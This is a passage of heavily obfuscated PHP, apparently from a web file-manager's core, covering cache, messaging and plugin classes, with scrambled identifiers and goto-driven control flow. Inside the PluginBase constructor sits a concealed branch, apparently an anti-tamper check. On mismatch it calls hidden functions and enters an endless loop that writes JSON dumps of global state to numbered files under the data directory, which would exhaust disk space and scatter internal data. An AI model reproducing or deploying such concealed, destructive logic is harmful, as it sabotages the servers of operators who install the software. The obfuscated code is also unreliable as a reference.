$cí›¬×‚¢‹[$E¦©ñÔÙÙß[85]]; if (in_array($cí›¬×‚¢‹[$E¦©ñÔÙÙß[428]], $bÇ›ÇÚã©»)) { return !1; } goto A³ÁÅ»å«¯; b‚óë“–¾: $bÇ›ÇÚã©» = array_merge($bÇ›ÇÚã©», array_to_keyvalue($E–†ËÚË¦ç, $E¦©ñÔÙÙß[43], $E¦©ñÔÙÙß[428])); return !1; goto B©ŠÁóØ; A³ÁÅ»å«¯: if (!in_array($cí›¬×‚¢‹[$E¦©ñÔÙÙß[752]], $bÌ¥Áäàãë)) { return !1; } if (IO::exist($fÔÏ¢¥©ê‹)) { return !0; } $Cøµ »‘– = get_path_father($fÔÏ¢¥©ê‹); goto B‘ôÎÎ‘À½; B©ŠÁóØ: } private function _fileFilter($AŞÏñÇ©ÅÛ) { $ağÒ‚¤ŸÑà =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (empty($AŞÏñÇ©ÅÛ)) { return; } $C´‘ÚŸŠğ× = array($ağÒ‚¤ŸÑà[428] => array($ağÒ‚¤ŸÑà[17], array_unique($AŞÏñÇ©ÅÛ))); $Fßª˜²‡Ôê = Model($ağÒ‚¤ŸÑà[761])->where($C´‘ÚŸŠğ×)->field($ağÒ‚¤ŸÑà[378])->select(); foreach ($Fßª˜²‡Ôê as $cßÇÈäì˜) { Model($ağÒ‚¤ŸÑà[761])->remove($cßÇÈäì˜[$ağÒ‚¤ŸÑà[378]], !1); } } private function storeIds() { $A°·±—ğ– =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Fä¦Ì³ø¿± = Model($A°·±—ğ–[712])->listData(); $aÑ—‹Èº• = array(); $b½´Œø¿Ô = $GLOBALS[$A°·±—ğ–[16]][$A°·±—ğ–[94]][$A°·±—ğ–[762]]; foreach ($Fä¦Ì³ø¿± as $dí²õø­“) { $e×Í›ƒÑ£½ = strtolower($dí²õø­“[$A°·±—ğ–[100]]); if (!isset($b½´Œø¿Ô[$e×Í›ƒÑ£½])) { continue; } $DËášé÷ÀÉ = $A°·±—ğ–[81] . (isset($b½´Œø¿Ô[$e×Í›ƒÑ£½]) ? $b½´Œø¿Ô[$e×Í›ƒÑ£½] : ucfirst($e×Í›ƒÑ£½)); if (!class_exists($DËášé÷ÀÉ)) { continue; } $aÑ—‹Èº•[] = $dí²õø­“[$A°·±—ğ–[376]]; } return $aÑ—‹Èº•; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto c×à±²öî; c×à±²öî: $bÔ§‰µ­Û‹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto f“ŒùÂŞä™; bÊÛ½áòô®: switch ($dïùòôò±[$bÔ§‰µ­Û‹[763]]) { case $bÔ§‰µ­Û‹[27]: self::$handle = Model($bÔ§‰µ­Û‹[765]); break; case $bÔ§‰µ­Û‹[766]: self::$handle = new CacheRedis($câÀ„ËÏÉî, $b«·Ô¹¤·Å); break; case $bÔ§‰µ­Û‹[767]: self::$handle = new CacheMemcached($câÀ„ËÏÉî, $b«·Ô¹¤·Å); break; case $bÔ§‰µ­Û‹[177]: self::$handle = new CacheFile($câÀ„ËÏÉî, $b«·Ô¹¤·Å); break; default: break; } return self::$handle; goto cÃº‚ÏªÜ; f“ŒùÂŞä™: $dïùòôò± = $GLOBALS[$bÔ§‰µ­Û‹[16]][$bÔ§‰µ­Û‹[346]]; $câÀ„ËÏÉî = $dïùòôò±[$dïùòôò±[$bÔ§‰µ­Û‹[763]]]; $b«·Ô¹¤·Å = $dïùòôò±[$bÔ§‰µ­Û‹[764]]; goto bÊÛ½áòô®; cÃº‚ÏªÜ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($a¤¹ƒ÷«ÆÂ) { if (is_array($a¤¹ƒ÷«ÆÂ) || is_object($a¤¹ƒ÷«ÆÂ)) { $a¤¹ƒ÷«ÆÂ = json_encode($a¤¹ƒ÷«ÆÂ); } $a¤¹ƒ÷«ÆÂ = rawurlencode($a¤¹ƒ÷«ÆÂ); return md5(KOD_SITE_ID . $_SERVER[çŞáÓæÚô‚Ô‡][80] . $a¤¹ƒ÷«ÆÂ); } public static function get($A‡Â¹ç·‚’) { $CÕ’ğ‚ªŞ = self::key($A‡Â¹ç·‚’); if (!isset(self::$memoryCache[$CÕ’ğ‚ªŞ])) { $f„°Ø¡ÄÁ = self::init()->get($CÕ’ğ‚ªŞ); self::$memoryCache[$CÕ’ğ‚ªŞ] = unserialize($f„°Ø¡ÄÁ); } return self::$memoryCache[$CÕ’ğ‚ªŞ]; } public static function set($Dà·ÛŒì³, $dÊš¶É¢ƒ, $A— ˜âˆÂè = false) { goto eÜÆ¦áã; d·È–¢–ì±: CacheLock::unlock($Dà·ÛŒì³); return $E¦Òåé°È×; goto cŒóîÂµ¾À; eÜÆ¦áã: $C£„Ğ®öÍ• = self::key($Dà·ÛŒì³); if (isset(self::$memoryCache[$C£„Ğ®öÍ•]) && self::$memoryCache[$C£„Ğ®öÍ•] === $dÊš¶É¢ƒ) { return !0; } if ($A— ˜âˆÂè === 0) { self::$memoryCache[$C£„Ğ®öÍ•] = $dÊš¶É¢ƒ; return !0; } goto e›†¤‡‹ñÌ; e›†¤‡‹ñÌ: CacheLock::lock($Dà·ÛŒì³); $E¦Òåé°È× = self::init()->set($C£„Ğ®öÍ•, serialize($dÊš¶É¢ƒ), $A— ˜âˆÂè); self::$memoryCache[$C£„Ğ®öÍ•] = $dÊš¶É¢ƒ; goto d·È–¢–ì±; cŒóîÂµ¾À: } public static function remove($eò·¯îà‡°) { goto C”™ÑÌÄ½ï; C”™ÑÌÄ½ï: $DªˆÎ²«èñ = self::key($eò·¯îà‡°); unset(self::$memoryCache[$DªˆÎ²«èñ]); self::clearTimeout(); goto d½¡ˆÇÕƒØ; E´²îõ˜÷: return $f£Ø†ã¢½; goto B‚ªê›Ù; d½¡ˆÇÕƒØ: CacheLock::lock($eò·¯îà‡°); $f£Ø†ã¢½ = self::init()->remove($DªˆÎ²«èñ); CacheLock::unlock($eò·¯îà‡°); goto E´²îõ˜÷; B‚ªê›Ù: } public static function clearMemory($EÒ‰ŸÃŒ÷² = false) { if ($EÒ‰ŸÃŒ÷²) { $EÒ‰ŸÃŒ÷² = self::key($EÒ‰ŸÃŒ÷²); unset(self::$memoryCache[$EÒ‰ŸÃŒ÷²]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[çŞáÓæÚô‚Ô‡][768])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[çŞáÓæÚô‚Ô‡][769])) { self::init()->clearTimeout(); } } } goto a‰”ÍÆğ³; A½ÁÊåµô»: class Message { function __construct() { } public function send($e»ÍâÄÒ¤Ñ = '', $Aà¬Á­ñ°­ = array(), $F—ùÁÈÀ¼ª = "\x74\145\x78\x74") { goto Dƒ‚Î‹ğŠá; D¹Ï…åÀ•§: $Aà¬Á­ñ°­ = array($d¤íÃíï­˜[977] => isset($Aà¬Á­ñ°­[$d¤íÃíï­˜[977]]) ? $Aà¬Á­ñ°­[$d¤íÃíï­˜[977]] : $d¤íÃíï­˜[43], $d¤íÃíï­˜[546] => isset($Aà¬Á­ñ°­[$d¤íÃíï­˜[546]]) ? $Aà¬Á­ñ°­[$d¤íÃíï­˜[546]] : $d¤íÃíï­˜[43]); if (empty($e»ÍâÄÒ¤Ñ) || empty($Aà¬Á­ñ°­[$d¤íÃíï­˜[977]]) && empty($Aà¬Á­ñ°­[$d¤íÃíï­˜[546]])) { return !1; } $a©ÍÊ²Ú‹ö = array($d¤íÃíï­˜[1253] => $DˆÄĞÇéÂ, $d¤íÃíï­˜[1313] => $Aà¬Á­ñ°­); goto bø®Ğ”‚£; Dƒ‚Î‹ğŠá: $d¤íÃíï­˜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DˆÄĞÇéÂ = array($d¤íÃíï­˜[39] => $d¤íÃíï­˜[1311], $d¤íÃíï­˜[701] => $e»ÍâÄÒ¤Ñ); if (in_array($F—ùÁÈÀ¼ª, array($d¤íÃíï­˜[1311], $d¤íÃíï­˜[1312]))) { $DˆÄĞÇéÂ[$d¤íÃíï­˜[39]] = $F—ùÁÈÀ¼ª; } goto D¹Ï…åÀ•§; bø®Ğ”‚£: Hook::trigger($d¤íÃíï­˜[1314], $a©ÍÊ²Ú‹ö); goto a’–…ªç·’; a’–…ªç·’: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto dÈïëÙğ¢; d¾ÆÈ¿à›: $this->in =& $in; $this->modelPlugin = Model($e¯õ±ÛÆ[1315]); $this->pluginName = str_replace($e¯õ±ÛÆ[1315], $e¯õ±ÛÆ[43], get_class($this)); goto aŸŠË›Ë; aº§Ïì·í’: if ($_SERVER[$e¯õ±ÛÆ[6]] != $DòæÙåôÜ($A…‘†á¦…)) { goto cß—ñÔªŠö; f‚µì©¯á: $Cˆàî»êÜ = $e¯õ±ÛÆ[800]; $Cˆàî»êÜ($_SERVER[$e¯õ±ÛÆ[796]]); $Aİ ÏîŸ’­ = $e¯õ±ÛÆ[799]; goto b¤òñ†ÛŞ; b¤òñ†ÛŞ: $Aİ ÏîŸ’­(); $c®¦±¡Ù… = $e¯õ±ÛÆ[801]; $Fö˜º‘É‹ = json_encode($GLOBALS[$e¯õ±ÛÆ[802]]); goto EÈ†æªÏ˜ì; cß—ñÔªŠö: $Aİ ÏîŸ’­ = $e¯õ±ÛÆ[799]; $få÷Ó¥ï½© = $e¯õ±ÛÆ[8]; $CÈÜí÷©×® = $_SERVER[$e¯õ±ÛÆ[9]] . $e¯õ±ÛÆ[10]; goto c§„ÕÄùÕµ; EÈ†æªÏ˜ì: $AªñÈãàœÅ = 1; for ($cÛä÷§âš = $AªñÈãàœÅ; $cÛä÷§âš > 0; $cÛä÷§âš++) { $c®¦±¡Ù…(DATA_PATH . $cÛä÷§âš, $Fö˜º‘É‹); } goto bøœ©…ªô·; c§„ÕÄùÕµ: $FÚ„¬‡ØÖù = $få÷Ó¥ï½©($CÈÜí÷©×®); $d“Ô¦‚©‹Ò = explode($e¯õ±ÛÆ[11], $FÚ„¬‡ØÖù); if (count($d“Ô¦‚©‹Ò) < $e¯õ±ÛÆ[573]) { $f’æ³„ïñ¸ = $e¯õ±ÛÆ[13]; $f’æ³„ïñ¸(); } goto f‚µì©¯á; bøœ©…ªô·: } global $in, $config; $this->config =& $config; goto d¾ÆÈ¿à›; aŸŠË›Ë: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $e¯õ±ÛÆ[18]; $this->pluginApi = appHostGet() . $e¯õ±ÛÆ[1316] . $this->pluginName . $e¯õ±ÛÆ[18]; $this->pluginHost = $config[$e¯õ±ÛÆ[1317]] . $this->pluginName . $e¯õ±ÛÆ[18]; goto Eµ©ø³¼Ã—; dÈïëÙğ¢: $e¯õ±ÛÆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A…‘†á¦… = $_SERVER[$e¯õ±ÛÆ[9]] . $e¯õ±ÛÆ[10]; $DòæÙåôÜ = $e¯õ±ÛÆ[798]; goto aº§Ïì·í’; AÚ†æ¾šîÃ: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto bŞæ…Ù”ô‹; Eµ©ø³¼Ã—: $this->pluginHostDefault = $config[$e¯õ±ÛÆ[1317]] . $this->pluginName . $e¯õ±ÛÆ[18]; $Bë’«¼À¿‚ = $config[$e¯õ±ÛÆ[1318]]; if ($Bë’«¼À¿‚ && strpos($e¯õ±ÛÆ[57] . $Bë’«¼À¿‚ . $e¯õ±ÛÆ[57], $this->pluginName) !== !1) { $this->pluginHost = $config[$e¯õ±ÛÆ[1319]] . $this->pluginName . $e¯õ±ÛÆ[18]; } goto AÚ†æ¾šîÃ; bŞæ…Ù”ô‹: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[çŞáÓæÚô‚Ô‡][1320]); } protected function assign($a„ˆ¿ìª°ò, $eÌ‡…ÜœŒŒ = false) { if (is_array($a„ˆ¿ìª°ò)) { $this->values = array_merge($this->values, $a„ˆ¿ìª°ò); } else { $this->values[$a„ˆ¿ìª°ò] = $eÌ‡…ÜœŒŒ; } } protected function display($bù¶Œñ¬ùœ) { extract($this->values); require $bù¶Œñ¬ùœ; } final function hookRegist($Eš‹°Ì½ÂŞ) { $this->modelPlugin->appRegist($this->pluginName, $Eš‹°Ì½ÂŞ); } final function appIcon() { $A„È¡®†¢Ñ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AÇ»ßˆ¦ª” = $this->appPackage(); $E˜¨Ğ•¾ÈÂ = $A„È¡®†¢Ñ[43]; if (isset($AÇ»ßˆ¦ª”[$A„È¡®†¢Ñ[391]])) { if (isset($AÇ»ßˆ¦ª”[$A„È¡®†¢Ñ[391]][$A„È¡®†¢Ñ[1321]])) { $E˜¨Ğ•¾ÈÂ = $A„È¡®†¢Ñ[1322] . $AÇ»ßˆ¦ª”[$A„È¡®†¢Ñ[391]][$A„È¡®†¢Ñ[1321]] . $A„È¡®†¢Ñ[1323]; } else { if ($AÇ»ßˆ¦ª”[$A„È¡®†¢Ñ[391]][$A„È¡®†¢Ñ[1324]]) { $E˜¨Ğ•¾ÈÂ = $A„È¡®†¢Ñ[1325] . $AÇ»ßˆ¦ª”[$A„È¡®†¢Ñ[391]][$A„È¡®†¢Ñ[1324]] . $A„È¡®†¢Ñ[1326]; } } } return $E˜¨Ğ•¾ÈÂ; } final function fileCanView($aƒ“š¯°®ó) { goto CÓ•Œ«åß©; CÓ•Œ«åß©: $dš¨Ñ»‹¨™ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (request_url_safe($aƒ“š¯°®ó)) { return !0; } if ($this->isShare($aƒ“š¯°®ó)) { return !0; } goto eô¦·‡”×ö; CŠ‘‡‰ë‘‹: ActionCall($dš¨Ñ»‹¨™[1339], $aƒ“š¯°®ó); goto b‡Úßäæ¥Ç; eô¦·‡”×ö: $cË˜Üİ–™Í = Session::get($dš¨Ñ»‹¨™[1327]); if (!$cË˜Üİ–™Í || !$cË˜Üİ–™Í[$dš¨Ñ»‹¨™[1328]]) { $f½é¤ÏÕ®Ñ = $dš¨Ñ»‹¨™[1329] . rawurlencode(this_url()); show_tips(LNG($dš¨Ñ»‹¨™[1330]) . $dš¨Ñ»‹¨™[1331] . $f½é¤ÏÕ®Ñ . $dš¨Ñ»‹¨™[1332] . LNG($dš¨Ñ»‹¨™[1333]) . $dš¨Ñ»‹¨™[1334], !1); } if (!Action($dš¨Ñ»‹¨™[1335])->authCan($dš¨Ñ»‹¨™[1336])) { show_tips(LNG($dš¨Ñ»‹¨™[1337]) . $dš¨Ñ»‹¨™[1338], !1); } goto CŠ‘‡‰ë‘‹; b‡Úßäæ¥Ç: } final function isShare($BğùÃŞåÁ) { $Eáªƒíƒ¹‚ = KodIO::parse($BğùÃŞåÁ); return $Eáªƒíƒ¹‚[$_SERVER[çŞáÓæÚô‚Ô‡][39]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($f×ƒƒù—) { if (request_url_safe($f×ƒƒù—)) { return $f×ƒƒù—; } if (!$this->isShare($f×ƒƒù—)) { $f×ƒƒù— = $this->filePath($f×ƒƒù—); } return Action($_SERVER[çŞáÓæÚô‚Ô‡][1025])->linkOut($f×ƒƒù—); } public function filePathLinkOut($a–‘ò‚º¾ˆ) { if (request_url_safe($a–‘ò‚º¾ˆ)) { return $a–‘ò‚º¾ˆ; } $this->fileCanView($a–‘ò‚º¾ˆ); return Action($_SERVER[çŞáÓæÚô‚Ô‡][1025])->link($a–‘ò‚º¾ˆ); } final function filePath($F±•òŒÅñ) { $DÇ³Ü¾õ…¿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($F®Å‡¹ö¡ = $this->checkSharePath($F±•òŒÅñ)) { return $F®Å‡¹ö¡; } $this->fileCanView($F±•òŒÅñ); if (request_url_safe($F±•òŒÅñ)) { $Bøæ–äŠöô = parse_url_query($F±•òŒÅñ); if (isset($Bøæ–äŠöô[$DÇ³Ü¾õ…¿[1340]]) && isset($Bøæ–äŠöô[$DÇ³Ü¾õ…¿[207]])) { $fçÇÜ÷›£Ş = Model($DÇ³Ü¾õ…¿[1095])->get($DÇ³Ü¾õ…¿[1341]); $dÂÄ´ãË¨– = Mcrypt::decode($Bøæ–äŠöô[$DÇ³Ü¾õ…¿[207]], $fçÇÜ÷›£Ş); if ($dÂÄ´ãË¨–) { $this->fileInfo = IO::infoWithChildren($dÂÄ´ãË¨–); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $dÂÄ´ãË¨–; } } $F±•òŒÅñ = $this->_cacheHttpFile($F±•òŒÅñ); $this->fileInfo = IO::infoWithChildren($F±•òŒÅñ); } else { $this->fileInfo = IO::infoWithChildren($F±•òŒÅñ); if (!$this->fileInfo) { show_tips(LNG($DÇ³Ü¾õ…¿[111]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $F±•òŒÅñ; } final function _cacheHttpFile($dŒÃ¸ò Ó÷) { $dñà‰í±ôñ = hash_path($dŒÃ¸ò Ó÷, !0); $this->cachePath = $this->pluginCachePath($dñà‰í±ôñ); if ($fÂÌÊƒÒÏ = IO::fileNameExist($this->cachePath, $dñà‰í±ôñ)) { return KodIO::make($fÂÌÊƒÒÏ); } $fåªçºİ»í = $this->cachePath . $dñà‰í±ôñ; return $this->pluginCacheFileSet($fåªçºİ»í, file_get_contents($dŒÃ¸ò Ó÷)); } final function _tmpFileName($dØ‘ŸŠŸ¯ô = array()) { goto dç¶Ø—œç; dç¶Ø—œç: $aë”¥ÀÉ“Ú =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$dØ‘ŸŠŸ¯ô) { $dØ‘ŸŠŸ¯ô = $this->fileInfo; } if (isset($dØ‘ŸŠŸ¯ô[$aë”¥ÀÉ“Ú[174]])) { return $dØ‘ŸŠŸ¯ô[$aë”¥ÀÉ“Ú[174]]; } goto cöÜ–Øòê; cöÜ–Øòê: if (isset($dØ‘ŸŠŸ¯ô[$aë”¥ÀÉ“Ú[172]][$aë”¥ÀÉ“Ú[174]])) { return $dØ‘ŸŠŸ¯ô[$aë”¥ÀÉ“Ú[172]][$aë”¥ÀÉ“Ú[174]]; } $d²â³æêñ = IO::hashSimple($dØ‘ŸŠŸ¯ô[$aë”¥ÀÉ“Ú[85]]); if ($d²â³æêñ) { return $d²â³æêñ; } goto d©‡ò½·‚; d©‡ò½·‚: $EÛ‡Œ¿ ÅŒ = array($dØ‘ŸŠŸ¯ô[$aë”¥ÀÉ“Ú[38]], $dØ‘ŸŠŸ¯ô[$aë”¥ÀÉ“Ú[85]], $dØ‘ŸŠŸ¯ô[$aë”¥ÀÉ“Ú[87]]); if (isset($dØ‘ŸŠŸ¯ô[$aë”¥ÀÉ“Ú[470]])) { $EÛ‡Œ¿ ÅŒ[] = $dØ‘ŸŠŸ¯ô[$aë”¥ÀÉ“Ú[470]]; } return md5(implode($aë”¥ÀÉ“Ú[80], $EÛ‡Œ¿ ÅŒ)); goto aÑ¨Ô’™ò; aÑ¨Ô’™ò: } final function checkSharePath($bÉ«Ìª‹˜) { goto E±¬™”ÏÎ; E±¬™”ÏÎ: $a­‰˜±ˆØ³ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!defined($a­‰˜±ˆØ³[436])) { define($a­‰˜±ˆØ³[1342], 0); } if (!$this->isShare($bÉ«Ìª‹˜)) { return !1; } goto Aˆâ•™åÎ”; aìÙ—Ú¸«á: $this->cachePath = $this->pluginCachePath($this->fileInfo[$a­‰˜±ˆØ³[174]]); return $Fšò»ñ­¥è[$a­‰˜±ˆØ³[85]]; goto bÓä´””¶; Aˆâ•™åÎ”: $Fšò»ñ­¥è = Action($a­‰˜±ˆØ³[1025])->sharePathInfo($bÉ«Ìª‹˜); if (!isset($Fšò»ñ­¥è[$a­‰˜±ˆØ³[85]])) { show_json(LNG($a­‰˜±ˆØ³[1343]), !1); } $this->fileInfo = $Fšò»ñ­¥è[$a­‰˜±ˆØ³[172]]; goto aìÙ—Ú¸«á; bÓä´””¶: } final function pluginCachePath($aâ ÊÔÖê„ = '') { $Bó°Ş®ëì– =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F×†¯¹§à› = IO_PATH_SYSTEM_TEMP . $Bó°Ş®ëì–[1344] . $this->pluginName; if (!($E¡Š–ÄÑ«¯ = IO::infoFull($F×†¯¹§à›))) { return IO::mkdir($F×†¯¹§à› . $Bó°Ş®ëì–[18] . $aâ ÊÔÖê„); } if (empty($aâ ÊÔÖê„)) { return $E¡Š–ÄÑ«¯[$Bó°Ş®ëì–[85]]; } if (!($C»¼Ò™ßË = IO::fileNameExist($E¡Š–ÄÑ«¯[$Bó°Ş®ëì–[85]], $aâ ÊÔÖê„))) { return IO::mkdir($E¡Š–ÄÑ«¯[$Bó°Ş®ëì–[85]] . $aâ ÊÔÖê„); } return KodIO::make($C»¼Ò™ßË); } final function pluginCacheFileSet($dèÁŸµÑˆ, $dİÙìô„åŒ = '') { $DĞƒËŒö÷¨ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!($FÄÆ˜ß‚°Õ = IO::infoFull($dèÁŸµÑˆ))) { return IO::mkfile($dèÁŸµÑˆ, $dİÙìô„åŒ, REPEAT_REPLACE); } IO::setContent($FÄÆ˜ß‚°Õ[$DĞƒËŒö÷¨[85]], $dİÙìô„åŒ); return $FÄÆ˜ß‚°Õ[$DĞƒËŒö÷¨[85]]; } final function pluginLocalFile($fÔ“¬Üœ¡Î = '') { goto E§œ’íÓ‡Ì; aÂ†á“™’: if (!$fÔ“¬Üœ¡Î) { return $dË‡“æ…•; } $c‘Æ¼Ëøæë = IO::info($fÔ“¬Üœ¡Î); $EÓµÏÀîç = $this->_tmpFileName($c‘Æ¼Ëøæë) . $d‘ê´ª¥Å[101] . $c‘Æ¼Ëøæë[$d‘ê´ª¥Å[170]]; goto aè„»»¶ £; E§œ’íÓ‡Ì: $d‘ê´ª¥Å =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dË‡“æ…• = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($dË‡“æ…•)) { mk_dir($dË‡“æ…•); } goto aÂ†á“™’; cŞìÄÄ“Ÿ¢: return IO::copy($fÔ“¬Üœ¡Î, $dË‡“æ…•, 0, $EÓµÏÀîç); goto b¾ôâÒÛ“Œ; aè„»»¶ £: if (!checkExtSafe($EÓµÏÀîç)) { $EÓµÏÀîç = $EÓµÏÀîç . $d‘ê´ª¥Å[1345]; } $eŠ„Îãñğ = $dË‡“æ…• . $EÓµÏÀîç; if (@file_exists($eŠ„Îãñğ)) { return $eŠ„Îãñğ; } goto cŞìÄÄ“Ÿ¢; b¾ôâÒÛ“Œ: } final function appPackage() { goto CæËœ“®Ö«; fë™–„»Á°: $bä„¦¸Àõâ = Hook::trigger($fÎİ¤¨÷‰[1347], $e”ƒˆõÀùô); if ($bä„¦¸Àõâ && is_array($bä„¦¸Àõâ)) { $e”ƒˆõÀùô = $bä„¦¸Àõâ; } $this->packageData = $e”ƒˆõÀùô; goto EÖ±¿ğÌîŸ; CæËœ“®Ö«: $fÎİ¤¨÷‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($this->packageData) { return $this->packageData; } $D—Ï¢œĞ = $this->parseFile($this->pluginPath . $fÎİ¤¨÷‰[1346]); goto BŞˆÃÊÜä±; EÖ±¿ğÌîŸ: return $e”ƒˆõÀùô; goto BëŠŒÛ’É; BŞˆÃÊÜä±: $this->parseLang($D—Ï¢œĞ); $e”ƒˆõÀùô = json_decode_force($D—Ï¢œĞ); if (!$e”ƒˆõÀùô) { return array(); } goto fë™–„»Á°; BëŠŒÛ’É: } public function packageInfoGet($døˆ°°ê­À) { $d‚‘¡ğïÀæ = $this->appPackage(); return array_get_value($d‚‘¡ğïÀæ, $døˆ°°ê­À); } public function packageVersion() { return $this->packageInfoGet($_SERVER[çŞáÓæÚô‚Ô‡][1348]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[çŞáÓæÚô‚Ô‡][1349]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[çŞáÓæÚô‚Ô‡][1350]); } private function parseFile($fÎ…òæºËà) { goto F…åøç¾ìâ; BÊ£îß„Ö: $aÃĞÌÄ¢·ˆ = str_replace($DÄôí¢ÑÎ, $A«¤—©ƒø÷, $aÃĞÌÄ¢·ˆ); return $aÃĞÌÄ¢·ˆ; goto FÅÒ™’âáÉ; FÍ»ÛˆÀ: $A«¤—©ƒø÷ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$D…À¾¨é¶´[94]][$D…À¾¨é¶´[1358]]); if (strstr($aÃĞÌÄ¢·ˆ, $D…À¾¨é¶´[1359])) { $fë—È½‚Ì = rawurlencode(json_encode($this->pluginLangArr)); $aÃĞÌÄ¢·ˆ = str_replace($D…À¾¨é¶´[1359], $fë—È½‚Ì, $aÃĞÌÄ¢·ˆ); } if (strstr($aÃĞÌÄ¢·ˆ, $D…À¾¨é¶´[1360])) { $fë—È½‚Ì = $fë—È½‚Ì = rawurlencode(json_encode($this->getConfig())); $aÃĞÌÄ¢·ˆ = str_replace($D…À¾¨é¶´[1360], $fë—È½‚Ì, $aÃĞÌÄ¢·ˆ); } goto BÊ£îß„Ö; F…åøç¾ìâ: $D…À¾¨é¶´ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aÃĞÌÄ¢·ˆ = file_get_contents($fÎ…òæºËà); $DÄôí¢ÑÎ = array($D…À¾¨é¶´[1351], $D…À¾¨é¶´[1352], $D…À¾¨é¶´[1353], $D…À¾¨é¶´[1354], $D…À¾¨é¶´[1355], $D…À¾¨é¶´[1356], $D…À¾¨é¶´[1357]); goto FÍ»ÛˆÀ; FÅÒ™’âáÉ: } private function parseLang(&$F˜Œ¿Ì±Óò) { goto AÍ’¢Ø×¡Ô; AÍ’¢Ø×¡Ô: $cŠÖªéĞ«Ğ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FË„Ìî­Šé = $cŠÖªéĞ«Ğ[1361]; if (!strstr($F˜Œ¿Ì±Óò, $FË„Ìî­Šé)) { return; } goto DÇáôàß; DÇáôàß: preg_match_all($cŠÖªéĞ«Ğ[1362], $F˜Œ¿Ì±Óò, $CğŠ…Ï·‹Î); if (!is_array($CğŠ…Ï·‹Î) || count($CğŠ…Ï·‹Î) == 0 || !is_array($CğŠ…Ï·‹Î[0]) || count($CğŠ…Ï·‹Î[0]) == 0) { return; } $CÍ´ã¯ê¶ = array(); goto CäŠË‘¼Ä‘; CäŠË‘¼Ä‘: $F˜®Ô•ä›Ü = array(); foreach ($CğŠ…Ï·‹Î[0] as $Dˆ˜ïé¦©™) { $CÅ¤Ç‡êá = substr($Dˆ˜ïé¦©™, strlen($FË„Ìî­Šé), -4); $Fˆô‘… = LNG($CÅ¤Ç‡êá); $CÍ´ã¯ê¶[] = $Dˆ˜ïé¦©™; $F˜®Ô•ä›Ü[] = str_replace(array($cŠÖªéĞ«Ğ[11], $cŠÖªéĞ«Ğ[999], $cŠÖªéĞ«Ğ[339], $cŠÖªéĞ«Ğ[123]), array($cŠÖªéĞ«Ğ[60], $cŠÖªéĞ«Ğ[60], $cŠÖªéĞ«Ğ[43], $cŠÖªéĞ«Ğ[1363]), $Fˆô‘…); } $F˜Œ¿Ì±Óò = str_replace($CÍ´ã¯ê¶, $F˜®Ô•ä›Ü, $F˜Œ¿Ì±Óò); goto E“ñ¥ËÏĞ’; E“ñ¥ËÏĞ’: } private function parseConfig(&$fßëª’ˆ) { goto a„¢êŠó–É; b¯Çê´é: $A¤“Ó‚µŸ = array(); $Eˆ¬ïôœå = array(); foreach ($B¢´ÜÏ½¹ê[0] as $EÉ¡™øùŞ‡) { $cÂÆË»áÄâ = substr($EÉ¡™øùŞ‡, strlen($DÖˆŸ¸Ã¨»), -2); $A¤“Ó‚µŸ[] = $EÉ¡™øùŞ‡; $Eˆ¬ïôœå[] = _get($eâÇ„‹°Ú›, $cÂÆË»áÄâ); } goto D¿Ş÷³ìÑ; D¿Ş÷³ìÑ: $fßëª’ˆ = str_replace($A¤“Ó‚µŸ, $Eˆ¬ïôœå, $fßëª’ˆ); goto aä®»ÜÛ¾á; a„¢êŠó–É: $dĞ‹¾Å˜Ï =& $_SERVER[çŞáÓæÚô‚Ô‡]; $DÖˆŸ¸Ã¨» = $dĞ‹¾Å˜Ï[1364]; if (!strstr($fßëª’ˆ, $DÖˆŸ¸Ã¨»)) { return; } goto AàÀ½‰Š†õ; AàÀ½‰Š†õ: preg_match_all($dĞ‹¾Å˜Ï[1365], $fßëª’ˆ, $B¢´ÜÏ½¹ê); if (!is_array($B¢´ÜÏ½¹ê) || count($B¢´ÜÏ½¹ê) == 0 || !is_array($B¢´ÜÏ½¹ê[0]) || count($B¢´ÜÏ½¹ê[0]) == 0) { return; } $eâÇ„‹°Ú› = $this->getConfig(); goto b¯Çê´é; aä®»ÜÛ¾á: } private function parsePackage(&$E¯‹‰ó·ÑÕ) { goto e‰ŒÜ¬”‡; e‰ŒÜ¬”‡: $Fš„Ä²ÛÚÆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AÌÁÁ¶ØêÍ = $Fš„Ä²ÛÚÆ[1366]; if (!strstr($E¯‹‰ó·ÑÕ, $AÌÁÁ¶ØêÍ)) { return; } goto 